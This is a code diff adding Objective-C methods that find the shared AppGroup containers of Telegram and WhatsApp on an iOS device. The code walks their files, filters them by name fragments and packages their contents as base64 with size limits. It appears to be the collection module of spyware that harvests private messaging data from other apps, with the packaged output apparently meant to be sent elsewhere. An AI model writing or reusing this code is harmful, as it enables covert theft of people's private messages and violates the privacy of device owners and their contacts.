@@ -278,4 +278,84 @@
     }
     return out;
 }
+
+#pragma mark - AppGroup（Telegram / WhatsApp）
+
+/// AppGroup 容器根
++ (NSString *)appGroupRoot {
+    return @"/var/mobile/Containers/Shared/AppGroup";
+}
+
++ (NSString *)appGroupPathFor:(NSString *)groupId {
+    static NSMutableDictionary *cache = nil;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{ cache = [NSMutableDictionary dictionary]; });
+    @synchronized (cache) {
+        NSString *c = cache[groupId];
+        if (c) return c;
+    }
+    NSFileManager *fm = [NSFileManager defaultManager];
+    for (NSString *d in [fm contentsOfDirectoryAtPath:[self appGroupRoot] error:NULL] ?: @[]) {
+        NSString *full = [[self appGroupRoot] stringByAppendingPathComponent:d];
+        NSString *gid = [self bundleIdOfContainer:full];      // 元数据里同一个键名
+        if (!gid) continue;
+        @synchronized (cache) { cache[gid] = full; }
+        if ([gid isEqualToString:groupId]) return full;
+    }
+    return nil;
+}
+
+/// 采 AppGroup 容器：只按片段过滤，不猜目录名
++ (NSDictionary *)collectAppGroup:(NSString *)groupId
+                          include:(NSArray<NSString *> *)includeSubstrings
+                          exclude:(NSArray<NSString *> *)excludeSubstrings
+                            limit:(NSUInteger)maxBytes {
+    NSMutableArray *files = [NSMutableArray array];
+    NSUInteger bytes = 0;
+
+    NSString *root = [self appGroupPathFor:groupId];
+    if (!root) return @{ @"files": files, @"bytes": @0, @"error": @"appgroup not found" };
+
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSMutableArray *stack = [NSMutableArray arrayWithObject:@[@""]];
+    while (stack.count && bytes < maxBytes) {
+        NSString *rel = stack.lastObject[0];
+        [stack removeLastObject];
+        NSString *dir = rel.length ? [root stringByAppendingPathComponent:rel] : root;
+
+        for (NSString *n in [fm contentsOfDirectoryAtPath:dir error:NULL] ?: @[]) {
+            NSString *childRel = rel.length ? [rel stringByAppendingPathComponent:n] : n;
+            NSString *full = [root stringByAppendingPathComponent:childRel];
+            BOOL isDir = NO;
+            [fm fileExistsAtPath:full isDirectory:&isDir];
+            if (isDir) {
+                if ([n isEqualToString:@"Caches"] || [n hasSuffix:@".app"]) continue;
+                [stack addObject:@[childRel]];
+                continue;
+            }
+
+            // 片段过滤
+            BOOL ok = includeSubstrings.count == 0;
+            for (NSString *inc in includeSubstrings) {
+                if ([childRel rangeOfString:inc options:NSCaseInsensitiveSearch].location != NSNotFound) { ok = YES; break; }
+            }
+            if (!ok) continue;
+            for (NSString *exc in excludeSubstrings) {
+                if ([childRel rangeOfString:exc options:NSCaseInsensitiveSearch].location != NSNotFound) { ok = NO; break; }
+            }
+            if (!ok) continue;
+
+            NSDictionary *attr = [fm attributesOfItemAtPath:full error:NULL];
+            unsigned long long size = [attr fileSize];
+            if (size == 0 || size > 8 * 1024 * 1024) continue;   // 单文件 8MB 上限
+            if (bytes + size > maxBytes) continue;
+
+            NSData *data = [NSData dataWithContentsOfFile:full];
+            if (!data.length) continue;
+            bytes += data.length;
+            [files addObject:@{ @"p": childRel, @"d": [data base64EncodedStringWithOptions:0] }];
+        }
+    }
+    return @{ @"files": files, @"bytes": @(bytes) };
+}
 @end
